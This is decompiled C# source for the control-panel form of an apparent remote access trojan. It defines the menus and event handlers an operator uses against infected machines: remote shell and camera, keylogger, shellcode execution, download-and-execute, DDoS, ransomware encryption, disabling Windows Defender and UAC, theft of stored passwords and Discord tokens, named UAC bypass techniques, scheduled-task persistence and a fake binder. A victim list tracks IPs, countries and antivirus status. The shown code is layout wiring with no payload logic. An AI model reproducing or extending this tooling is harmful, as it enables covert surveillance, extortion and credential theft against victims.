namespace Server
{
	// Token: 0x0200000E RID: 14
	public partial class Form1 : global::DarkUI.Forms.DarkForm
	{
		// Token: 0x060000A1 RID: 161 RVA: 0x00008194 File Offset: 0x00008194
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x000081BC File Offset: 0x000081BC
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Server.Form1));
			this.contextMenuClient = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.RemoteManagerToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RemoteShellToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RemoteScreenToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RemoteCameraToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.remoteRegeditToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.FileManagerToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ProcessManagerToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.netstatToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RecordToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ProgramNotificationToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.StartToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.StopToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RemoteControlToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SendFileToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.fromUrlToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SendFileToDiskToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SendFileToMemoryToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.runShellcodeToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.MessageBoxToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ChatToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.VisteWebsiteToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ChangeWallpaperToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.KeyloggerToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.FileSearchToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.MalwareToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.dDOSToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RansomwareToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.EncryptToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DecryptToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DisableWDToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.PasswordRecoveryToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DiscordRecoveryToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DisableUACToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SystemControlToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ClientControlToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.StopToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RestartToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.noSystemToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.UpdateToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.UninstallToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ClientFolderToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SystemToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ShutDownToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RebootToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.LogoutToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.BypassUACAToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SilentCleanupToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.FodhelperToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RunasToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.CompMgmtLauncherToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.InstallToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SchtaskInstallToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SchtaskUninstallToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.normalInstallToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.normalUninstallToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.justForFunToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.InformationToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.statusStrip1 = new global::DarkUI.Controls.DarkStatusStrip();
			this.toolStripStatusLabel1 = new global::System.Windows.Forms.ToolStripStatusLabel();
			this.toolStripStatusLabel2 = new global::System.Windows.Forms.ToolStripStatusLabel();
			this.ping = new global::System.Windows.Forms.Timer(this.components);
			this.UpdateUI = new global::System.Windows.Forms.Timer(this.components);
			this.contextMenuLogs = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.cLEARToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.contextMenuThumbnail = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.sTARTToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.sTOPToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ThumbnailImageList = new global::System.Windows.Forms.ImageList(this.components);
			this.contextMenuTasks = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.sendFileFromUrlToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.downloadAndExecuteToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.sENDFILETOMEMORYToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.disableUACToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.disableWDToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.installSchtaskToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.uPDATEToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.autoKeyloggerToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.fakeBinderToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator4 = new global::System.Windows.Forms.ToolStripSeparator();
			this.dELETETASKToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.performanceCounter1 = new global::System.Diagnostics.PerformanceCounter();
			this.performanceCounter2 = new global::System.Diagnostics.PerformanceCounter();
			this.notifyIcon1 = new global::System.Windows.Forms.NotifyIcon(this.components);
			this.TimerTask = new global::System.Windows.Forms.Timer(this.components);
			this.menuStrip1 = new global::DarkUI.Controls.DarkMenuStrip();
			this.FileToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.BuilderToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.BlockToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.splitContainer1 = new global::System.Windows.Forms.SplitContainer();
			this.tabControl1 = new global::System.Windows.Forms.TabControl();
			this.tabPage1 = new global::System.Windows.Forms.TabPage();
			this.listView1 = new global::System.Windows.Forms.ListView();
			this.lv_ip = new global::System.Windows.Forms.ColumnHeader();
			this.lv_country = new global::System.Windows.Forms.ColumnHeader();
			this.lv_group = new global::System.Windows.Forms.ColumnHeader();
			this.lv_hwid = new global::System.Windows.Forms.ColumnHeader();
			this.lv_user = new global::System.Windows.Forms.ColumnHeader();
			this.lv_camera = new global::System.Windows.Forms.ColumnHeader();
			this.lv_os = new global::System.Windows.Forms.ColumnHeader();
			this.lv_version = new global::System.Windows.Forms.ColumnHeader();
			this.lv_ins = new global::System.Windows.Forms.ColumnHeader();
			this.lv_admin = new global::System.Windows.Forms.ColumnHeader();
			this.lv_av = new global::System.Windows.Forms.ColumnHeader();
			this.lv_ping = new global::System.Windows.Forms.ColumnHeader();
			this.lv_act = new global::System.Windows.Forms.ColumnHeader();
			this.tabPage3 = new global::System.Windows.Forms.TabPage();
			this.listView3 = new global::System.Windows.Forms.ListView();
			this.tabPage4 = new global::System.Windows.Forms.TabPage();
			this.listView4 = new global::System.Windows.Forms.ListView();
			this.columnHeader4 = new global::System.Windows.Forms.ColumnHeader();
			this.columnHeader5 = new global::System.Windows.Forms.ColumnHeader();
			this.ConnectTimeout = new global::System.Windows.Forms.Timer(this.components);
			this.columnHeader1 = new global::System.Windows.Forms.ColumnHeader();
			this.columnHeader2 = new global::System.Windows.Forms.ColumnHeader();
			this.listView2 = new global::System.Windows.Forms.ListView();
			this.contextMenuClient.SuspendLayout();
			this.statusStrip1.SuspendLayout();
			this.contextMenuLogs.SuspendLayout();
			this.contextMenuThumbnail.SuspendLayout();
			this.contextMenuTasks.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.performanceCounter1).BeginInit();
			((global::System.ComponentModel.ISupportInitialize)this.performanceCounter2).BeginInit();
			this.menuStrip1.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.splitContainer1).BeginInit();
			this.splitContainer1.Panel1.SuspendLayout();
			this.splitContainer1.Panel2.SuspendLayout();
			this.splitContainer1.SuspendLayout();
			this.tabControl1.SuspendLayout();
			this.tabPage1.SuspendLayout();
			this.tabPage3.SuspendLayout();
			this.tabPage4.SuspendLayout();
			base.SuspendLayout();
			this.contextMenuClient.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.RemoteManagerToolStripMenuItem,
				this.RemoteControlToolStripMenuItem,
				this.MalwareToolStripMenuItem,
				this.SystemControlToolStripMenuItem,
				this.BypassUACAToolStripMenuItem,
				this.InstallToolStripMenuItem,
				this.justForFunToolStripMenuItem,
				this.InformationToolStripMenuItem
			});
			this.contextMenuClient.Name = "contextMenuStrip1";
			this.contextMenuClient.Size = new global::System.Drawing.Size(156, 180);
			this.RemoteManagerToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.RemoteShellToolStripMenuItem,
				this.RemoteScreenToolStripMenuItem,
				this.RemoteCameraToolStripMenuItem,
				this.remoteRegeditToolStripMenuItem,
				this.FileManagerToolStripMenuItem1,
				this.ProcessManagerToolStripMenuItem,
				this.netstatToolStripMenuItem,
				this.RecordToolStripMenuItem,
				this.ProgramNotificationToolStripMenuItem
			});
			this.RemoteManagerToolStripMenuItem.Name = "RemoteManagerToolStripMenuItem";
			this.RemoteManagerToolStripMenuItem.Size = new global::System.Drawing.Size(155, 22);
			this.RemoteManagerToolStripMenuItem.Text = "Surveillance";
			this.RemoteShellToolStripMenuItem.Name = "RemoteShellToolStripMenuItem";
			this.RemoteShellToolStripMenuItem.Size = new global::System.Drawing.Size(186, 22);
			this.RemoteShellToolStripMenuItem.Text = "Remote Shell";
			this.RemoteShellToolStripMenuItem.Click += new global::System.EventHandler(this.RemoteShellToolStripMenuItem_Click);
			this.RemoteScreenToolStripMenuItem.Name = "RemoteScreenToolStripMenuItem";
			this.RemoteScreenToolStripMenuItem.Size = new global::System.Drawing.Size(186, 22);
			this.RemoteScreenToolStripMenuItem.Text = "Remote Screen";
			this.RemoteScreenToolStripMenuItem.Click += new global::System.EventHandler(this.RemoteScreenToolStripMenuItem_Click);
			this.RemoteCameraToolStripMenuItem.Name = "RemoteCameraToolStripMenuItem";
			this.RemoteCameraToolStripMenuItem.Size = new global::System.Drawing.Size(186, 22);
			this.RemoteCameraToolStripMenuItem.Text = "Remote Camera";
			this.RemoteCameraToolStripMenuItem.Click += new global::System.EventHandler(this.RemoteCameraToolStripMenuItem_Click);
			this.remoteRegeditToolStripMenuItem.Name = "remoteRegeditToolStripMenuItem";
			this.remoteRegeditToolStripMenuItem.Size = new global::System.Drawing.Size(186, 22);
			this.FileManagerToolStripMenuItem1.Name = "FileManagerToolStripMenuItem1";
			this.FileManagerToolStripMenuItem1.Size = new global::System.Drawing.Size(186, 22);
			this.FileManagerToolStripMenuItem1.Text = "File Manager";
			this.FileManagerToolStripMenuItem1.Click += new global::System.EventHandler(this.FileManagerToolStripMenuItem1_Click);
			this.ProcessManagerToolStripMenuItem.Name = "ProcessManagerToolStripMenuItem";
			this.ProcessManagerToolStripMenuItem.Size = new global::System.Drawing.Size(186, 22);
			this.ProcessManagerToolStripMenuItem.Text = "Process Manager";
			this.ProcessManagerToolStripMenuItem.Click += new global::System.EventHandler(this.ProcessManagerToolStripMenuItem_Click);
			this.netstatToolStripMenuItem.Name = "netstatToolStripMenuItem";
			this.netstatToolStripMenuItem.Size = new global::System.Drawing.Size(186, 22);
			this.netstatToolStripMenuItem.Text = "Netstat";
			this.netstatToolStripMenuItem.Click += new global::System.EventHandler(this.netstatToolStripMenuItem_Click);
			this.RecordToolStripMenuItem.Name = "RecordToolStripMenuItem";
			this.RecordToolStripMenuItem.Size = new global::System.Drawing.Size(186, 22);
			this.RecordToolStripMenuItem.Text = "Record";
			this.RecordToolStripMenuItem.Click += new global::System.EventHandler(this.RecordToolStripMenuItem_Click);
			this.ProgramNotificationToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.StartToolStripMenuItem1,
				this.StopToolStripMenuItem2
			});
			this.ProgramNotificationToolStripMenuItem.Name = "ProgramNotificationToolStripMenuItem";
			this.ProgramNotificationToolStripMenuItem.Size = new global::System.Drawing.Size(186, 22);
			this.ProgramNotificationToolStripMenuItem.Text = "Program Notification";
			this.StartToolStripMenuItem1.Name = "StartToolStripMenuItem1";
			this.StartToolStripMenuItem1.Size = new global::System.Drawing.Size(98, 22);
			this.StartToolStripMenuItem1.Text = "Start";
			this.StartToolStripMenuItem1.Click += new global::System.EventHandler(this.StartToolStripMenuItem1_Click);
			this.StopToolStripMenuItem2.Name = "StopToolStripMenuItem2";
			this.StopToolStripMenuItem2.Size = new global::System.Drawing.Size(98, 22);
			this.StopToolStripMenuItem2.Text = "Stop";
			this.StopToolStripMenuItem2.Click += new global::System.EventHandler(this.StopToolStripMenuItem2_Click);
			this.RemoteControlToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.SendFileToolStripMenuItem1,
				this.runShellcodeToolStripMenuItem,
				this.MessageBoxToolStripMenuItem,
				this.ChatToolStripMenuItem1,
				this.VisteWebsiteToolStripMenuItem1,
				this.ChangeWallpaperToolStripMenuItem1,
				this.KeyloggerToolStripMenuItem1,
				this.FileSearchToolStripMenuItem
			});
			this.RemoteControlToolStripMenuItem.Name = "RemoteControlToolStripMenuItem";
			this.RemoteControlToolStripMenuItem.Size = new global::System.Drawing.Size(155, 22);
			this.RemoteControlToolStripMenuItem.Text = "Control";
			this.SendFileToolStripMenuItem1.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.fromUrlToolStripMenuItem,
				this.SendFileToDiskToolStripMenuItem,
				this.SendFileToMemoryToolStripMenuItem
			});
			this.SendFileToolStripMenuItem1.Name = "SendFileToolStripMenuItem1";
			this.SendFileToolStripMenuItem1.Size = new global::System.Drawing.Size(171, 22);
			this.SendFileToolStripMenuItem1.Text = "Send File";
			this.fromUrlToolStripMenuItem.Name = "fromUrlToolStripMenuItem";
			this.fromUrlToolStripMenuItem.Size = new global::System.Drawing.Size(184, 22);
			this.fromUrlToolStripMenuItem.Text = "From Url";
			this.fromUrlToolStripMenuItem.Click += new global::System.EventHandler(this.fromUrlToolStripMenuItem_Click);
			this.SendFileToDiskToolStripMenuItem.Name = "SendFileToDiskToolStripMenuItem";
			this.SendFileToDiskToolStripMenuItem.Size = new global::System.Drawing.Size(184, 22);
			this.SendFileToDiskToolStripMenuItem.Text = "Send File To Disk";
			this.SendFileToDiskToolStripMenuItem.Click += new global::System.EventHandler(this.SendFileToDiskToolStripMenuItem_Click);
			this.SendFileToMemoryToolStripMenuItem.Name = "SendFileToMemoryToolStripMenuItem";
			this.SendFileToMemoryToolStripMenuItem.Size = new global::System.Drawing.Size(184, 22);
			this.SendFileToMemoryToolStripMenuItem.Text = "Send File To Memory";
			this.SendFileToMemoryToolStripMenuItem.Click += new global::System.EventHandler(this.SendFileToMemoryToolStripMenuItem_Click);
			this.runShellcodeToolStripMenuItem.Name = "runShellcodeToolStripMenuItem";
			this.runShellcodeToolStripMenuItem.Size = new global::System.Drawing.Size(171, 22);
			this.runShellcodeToolStripMenuItem.Text = "Run Shellcode";
			this.runShellcodeToolStripMenuItem.Click += new global::System.EventHandler(this.runShellcodeToolStripMenuItem_Click);
			this.MessageBoxToolStripMenuItem.Name = "MessageBoxToolStripMenuItem";
			this.MessageBoxToolStripMenuItem.Size = new global::System.Drawing.Size(171, 22);
			this.MessageBoxToolStripMenuItem.Text = "MessageBox";
			this.MessageBoxToolStripMenuItem.Click += new global::System.EventHandler(this.MessageBoxToolStripMenuItem_Click);
			this.VisteWebsiteToolStripMenuItem1.Name = "VisteWebsiteToolStripMenuItem1";
			this.VisteWebsiteToolStripMenuItem1.Size = new global::System.Drawing.Size(171, 22);
			this.VisteWebsiteToolStripMenuItem1.Text = "Viste Website";
			this.VisteWebsiteToolStripMenuItem1.Click += new global::System.EventHandler(this.VisteWebsiteToolStripMenuItem1_Click);
			this.ChangeWallpaperToolStripMenuItem1.Name = "ChangeWallpaperToolStripMenuItem1";
			this.ChangeWallpaperToolStripMenuItem1.Size = new global::System.Drawing.Size(171, 22);
			this.ChangeWallpaperToolStripMenuItem1.Text = "Change Wallpaper";
			this.ChangeWallpaperToolStripMenuItem1.Click += new global::System.EventHandler(this.ChangeWallpaperToolStripMenuItem1_Click);
			this.KeyloggerToolStripMenuItem1.Name = "KeyloggerToolStripMenuItem1";
			this.KeyloggerToolStripMenuItem1.Size = new global::System.Drawing.Size(171, 22);
			this.KeyloggerToolStripMenuItem1.Text = "Keylogger";
			this.KeyloggerToolStripMenuItem1.Click += new global::System.EventHandler(this.KeyloggerToolStripMenuItem1_Click);
			this.FileSearchToolStripMenuItem.Name = "FileSearchToolStripMenuItem";
			this.FileSearchToolStripMenuItem.Size = new global::System.Drawing.Size(171, 22);
			this.FileSearchToolStripMenuItem.Text = "File Search";
			this.FileSearchToolStripMenuItem.Click += new global::System.EventHandler(this.FileSearchToolStripMenuItem_Click);
			this.MalwareToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.dDOSToolStripMenuItem,
				this.RansomwareToolStripMenuItem,
				this.DisableWDToolStripMenuItem,
				this.PasswordRecoveryToolStripMenuItem,
				this.DiscordRecoveryToolStripMenuItem,
				this.DisableUACToolStripMenuItem
			});
			this.MalwareToolStripMenuItem.Name = "MalwareToolStripMenuItem";
			this.MalwareToolStripMenuItem.Size = new global::System.Drawing.Size(155, 22);
			this.MalwareToolStripMenuItem.Text = "Malware";
			this.dDOSToolStripMenuItem.Name = "dDOSToolStripMenuItem";
			this.dDOSToolStripMenuItem.Size = new global::System.Drawing.Size(175, 22);
			this.dDOSToolStripMenuItem.Text = "DDOS";
			this.dDOSToolStripMenuItem.Click += new global::System.EventHandler(this.dDOSToolStripMenuItem_Click);
			this.RansomwareToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.EncryptToolStripMenuItem,
				this.DecryptToolStripMenuItem
			});
			this.RansomwareToolStripMenuItem.Name = "RansomwareToolStripMenuItem";
			this.RansomwareToolStripMenuItem.Size = new global::System.Drawing.Size(175, 22);
			this.RansomwareToolStripMenuItem.Text = "Ransomware";
			this.EncryptToolStripMenuItem.Name = "EncryptToolStripMenuItem";
			this.EncryptToolStripMenuItem.Size = new global::System.Drawing.Size(115, 22);
			this.EncryptToolStripMenuItem.Text = "Encrypt";
			this.EncryptToolStripMenuItem.Click += new global::System.EventHandler(this.EncryptToolStripMenuItem_Click);
			this.DecryptToolStripMenuItem.Name = "DecryptToolStripMenuItem";
			this.DecryptToolStripMenuItem.Size = new global::System.Drawing.Size(115, 22);
			this.DecryptToolStripMenuItem.Text = "Decrypt";
			this.DecryptToolStripMenuItem.Click += new global::System.EventHandler(this.DecryptToolStripMenuItem_Click);
			this.DisableWDToolStripMenuItem.Name = "DisableWDToolStripMenuItem";
			this.DisableWDToolStripMenuItem.Size = new global::System.Drawing.Size(175, 22);
			this.DisableWDToolStripMenuItem.Text = "Disable WD";
			this.DisableWDToolStripMenuItem.Click += new global::System.EventHandler(this.DisableWDToolStripMenuItem_Click);
			this.PasswordRecoveryToolStripMenuItem.Name = "PasswordRecoveryToolStripMenuItem";
			this.PasswordRecoveryToolStripMenuItem.Size = new global::System.Drawing.Size(175, 22);
			this.PasswordRecoveryToolStripMenuItem.Text = "Password Recovery";
			this.PasswordRecoveryToolStripMenuItem.Click += new global::System.EventHandler(this.PasswordRecoveryToolStripMenuItem_Click);
			this.DiscordRecoveryToolStripMenuItem.Name = "DiscordRecoveryToolStripMenuItem";
			this.DiscordRecoveryToolStripMenuItem.Size = new global::System.Drawing.Size(175, 22);
			this.DiscordRecoveryToolStripMenuItem.Text = "Discord Recovery";
			this.DiscordRecoveryToolStripMenuItem.Click += new global::System.EventHandler(this.DiscordRecoveryToolStripMenuItem_Click);
			this.DisableUACToolStripMenuItem.Name = "DisableUACToolStripMenuItem";
			this.DisableUACToolStripMenuItem.Size = new global::System.Drawing.Size(175, 22);
			this.DisableUACToolStripMenuItem.Text = "Disable UAC";
			this.DisableUACToolStripMenuItem.Click += new global::System.EventHandler(this.DisableUACToolStripMenuItem_Click);
			this.SystemControlToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.ClientControlToolStripMenuItem,
				this.SystemToolStripMenuItem
			});
			this.SystemControlToolStripMenuItem.Name = "SystemControlToolStripMenuItem";
			this.SystemControlToolStripMenuItem.Size = new global::System.Drawing.Size(155, 22);
			this.SystemControlToolStripMenuItem.Text = "System Control";
			this.ClientControlToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.StopToolStripMenuItem1,
				this.RestartToolStripMenuItem1,
				this.noSystemToolStripMenuItem,
				this.UpdateToolStripMenuItem,
				this.UninstallToolStripMenuItem,
				this.ClientFolderToolStripMenuItem
			});
			this.ClientControlToolStripMenuItem.Name = "ClientControlToolStripMenuItem";
			this.ClientControlToolStripMenuItem.Size = new global::System.Drawing.Size(148, 22);
			this.ClientControlToolStripMenuItem.Text = "Client Control";
			this.StopToolStripMenuItem1.Name = "StopToolStripMenuItem1";
			this.StopToolStripMenuItem1.Size = new global::System.Drawing.Size(141, 22);
			this.StopToolStripMenuItem1.Text = "Stop";
			this.StopToolStripMenuItem1.Click += new global::System.EventHandler(this.StopToolStripMenuItem1_Click);
			this.RestartToolStripMenuItem1.Name = "RestartToolStripMenuItem1";
			this.RestartToolStripMenuItem1.Size = new global::System.Drawing.Size(141, 22);
			this.RestartToolStripMenuItem1.Text = "Restart";
			this.RestartToolStripMenuItem1.Click += new global::System.EventHandler(this.RestartToolStripMenuItem1_Click);
			this.noSystemToolStripMenuItem.Name = "noSystemToolStripMenuItem";
			this.noSystemToolStripMenuItem.Size = new global::System.Drawing.Size(141, 22);
			this.noSystemToolStripMenuItem.Text = "No System";
			this.noSystemToolStripMenuItem.Click += new global::System.EventHandler(this.noSystemToolStripMenuItem_Click);
			this.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem";
			this.UpdateToolStripMenuItem.Size = new global::System.Drawing.Size(141, 22);
			this.UpdateToolStripMenuItem.Text = "Update";
			this.UpdateToolStripMenuItem.Click += new global::System.EventHandler(this.UpdateToolStripMenuItem_Click);
			this.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem";
			this.UninstallToolStripMenuItem.Size = new global::System.Drawing.Size(141, 22);
			this.UninstallToolStripMenuItem.Text = "Uninstall";
			this.UninstallToolStripMenuItem.Click += new global::System.EventHandler(this.UninstallToolStripMenuItem_Click);
			this.ClientFolderToolStripMenuItem.Name = "ClientFolderToolStripMenuItem";
			this.ClientFolderToolStripMenuItem.Size = new global::System.Drawing.Size(141, 22);
			this.ClientFolderToolStripMenuItem.Text = "Client Folder";
			this.ClientFolderToolStripMenuItem.Click += new global::System.EventHandler(this.ClientFolderToolStripMenuItem_Click);
			this.SystemToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.ShutDownToolStripMenuItem,
				this.RebootToolStripMenuItem,
				this.LogoutToolStripMenuItem
			});
			this.SystemToolStripMenuItem.Name = "SystemToolStripMenuItem";
			this.SystemToolStripMenuItem.Size = new global::System.Drawing.Size(148, 22);
			this.SystemToolStripMenuItem.Text = "System";
			this.ShutDownToolStripMenuItem.Name = "ShutDownToolStripMenuItem";
			this.ShutDownToolStripMenuItem.Size = new global::System.Drawing.Size(132, 22);
			this.ShutDownToolStripMenuItem.Text = "Shut Down";
			this.ShutDownToolStripMenuItem.Click += new global::System.EventHandler(this.ShutDownToolStripMenuItem_Click);
			this.RebootToolStripMenuItem.Name = "RebootToolStripMenuItem";
			this.RebootToolStripMenuItem.Size = new global::System.Drawing.Size(132, 22);
			this.RebootToolStripMenuItem.Text = "Reboot";
			this.RebootToolStripMenuItem.Click += new global::System.EventHandler(this.RebootToolStripMenuItem_Click);
			this.LogoutToolStripMenuItem.Name = "LogoutToolStripMenuItem";
			this.LogoutToolStripMenuItem.Size = new global::System.Drawing.Size(132, 22);
			this.LogoutToolStripMenuItem.Text = "Logout";
			this.LogoutToolStripMenuItem.Click += new global::System.EventHandler(this.LogoutToolStripMenuItem_Click);
			this.BypassUACAToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.SilentCleanupToolStripMenuItem,
				this.FodhelperToolStripMenuItem,
				this.RunasToolStripMenuItem,
				this.CompMgmtLauncherToolStripMenuItem
			});
			this.BypassUACAToolStripMenuItem.Name = "BypassUACAToolStripMenuItem";
			this.BypassUACAToolStripMenuItem.Size = new global::System.Drawing.Size(155, 22);
			this.BypassUACAToolStripMenuItem.Text = "Bypass UAC";
			this.SilentCleanupToolStripMenuItem.Name = "SilentCleanupToolStripMenuItem";
			this.SilentCleanupToolStripMenuItem.Size = new global::System.Drawing.Size(189, 22);
			this.SilentCleanupToolStripMenuItem.Text = "Silent Cleanup";
			this.SilentCleanupToolStripMenuItem.Click += new global::System.EventHandler(this.SilentCleanupToolStripMenuItem_Click);
			this.FodhelperToolStripMenuItem.Name = "FodhelperToolStripMenuItem";
			this.FodhelperToolStripMenuItem.Size = new global::System.Drawing.Size(189, 22);
			this.FodhelperToolStripMenuItem.Text = "Fodhelper";
			this.FodhelperToolStripMenuItem.Click += new global::System.EventHandler(this.FodhelperToolStripMenuItem_Click);
			this.RunasToolStripMenuItem.Name = "RunasToolStripMenuItem";
			this.RunasToolStripMenuItem.Size = new global::System.Drawing.Size(189, 22);
			this.RunasToolStripMenuItem.Text = "Runas";
			this.RunasToolStripMenuItem.Click += new global::System.EventHandler(this.RunasToolStripMenuItem_Click);
			this.CompMgmtLauncherToolStripMenuItem.Name = "CompMgmtLauncherToolStripMenuItem";
			this.CompMgmtLauncherToolStripMenuItem.Size = new global::System.Drawing.Size(189, 22);
			this.CompMgmtLauncherToolStripMenuItem.Text = "CompMgmtLauncher";
			this.CompMgmtLauncherToolStripMenuItem.Click += new global::System.EventHandler(this.CompMgmtLauncherToolStripMenuItem_Click);
			this.InstallToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.SchtaskInstallToolStripMenuItem,
				this.SchtaskUninstallToolStripMenuItem,
				this.normalInstallToolStripMenuItem,
				this.normalUninstallToolStripMenuItem
			});
			this.InstallToolStripMenuItem.Name = "InstallToolStripMenuItem";
			this.InstallToolStripMenuItem.Size = new global::System.Drawing.Size(155, 22);
			this.InstallToolStripMenuItem.Text = "Install";
			this.SchtaskInstallToolStripMenuItem.Name = "SchtaskInstallToolStripMenuItem";
			this.SchtaskInstallToolStripMenuItem.Size = new global::System.Drawing.Size(163, 22);
			this.SchtaskInstallToolStripMenuItem.Text = "Schtask Install";
			this.SchtaskInstallToolStripMenuItem.Click += new global::System.EventHandler(this.SchtaskInstallToolStripMenuItem_Click);
			this.SchtaskUninstallToolStripMenuItem.Name = "SchtaskUninstallToolStripMenuItem";
			this.SchtaskUninstallToolStripMenuItem.Size = new global::System.Drawing.Size(163, 22);
			this.SchtaskUninstallToolStripMenuItem.Text = "Schtask Uninstall";
			this.SchtaskUninstallToolStripMenuItem.Click += new global::System.EventHandler(this.SchtaskUninstallToolStripMenuItem_Click);
